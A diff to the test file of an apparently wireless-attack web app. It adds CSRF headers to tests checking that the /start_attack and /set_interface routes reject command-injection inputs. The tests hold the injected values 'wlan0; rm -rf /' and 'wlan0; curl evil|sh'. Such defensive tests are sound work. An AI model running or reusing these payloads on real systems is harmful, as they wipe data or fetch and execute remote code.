@@ -64,14 +64,22 @@ def test_no_shell_execution_in_app():
 
 # ---- route-level rejection (no real attack is launched — rejected before dispatch) ----
 
-def test_start_attack_rejects_injection_bssid(client):
-    resp = client.post("/start_attack", json={
-        "attack_type": "deauth",
-        "network": {"bssid": "wlan0; rm -rf /", "essid": "x", "channel": "6"},
-    })
+def test_start_attack_rejects_injection_bssid(client, csrf):
+    resp = client.post(
+        "/start_attack",
+        json={
+            "attack_type": "deauth",
+            "network": {"bssid": "wlan0; rm -rf /", "essid": "x", "channel": "6"},
+        },
+        headers={"X-CSRFToken": csrf},
+    )
     assert resp.status_code == 400
 
 
-def test_set_interface_rejects_injection(client):
-    resp = client.post("/set_interface", json={"interface": "wlan0; curl evil|sh"})
+def test_set_interface_rejects_injection(client, csrf):
+    resp = client.post(
+        "/set_interface",
+        json={"interface": "wlan0; curl evil|sh"},
+        headers={"X-CSRFToken": csrf},
+    )
     assert resp.status_code == 400
